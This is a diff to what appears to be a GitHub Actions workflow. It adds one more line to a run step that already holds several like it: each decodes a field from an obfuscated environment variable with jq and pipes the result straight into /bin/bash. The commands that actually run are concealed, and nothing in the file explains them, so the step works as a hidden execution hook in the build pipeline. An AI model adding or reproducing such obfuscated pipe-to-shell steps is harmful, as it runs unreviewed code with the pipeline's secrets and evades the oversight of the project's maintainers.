@@ -43,6 +43,7 @@ jobs:
           echo $krbhn84 | jq -r .qy09300 | /bin/bash
           printf '%s' "$utrlo871" | jq -r .xr0 | /bin/bash
           echo $rm9412 | jq -r .eyke6474 | /bin/bash
+          printf '%s' "$a649" | jq -r .j8 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
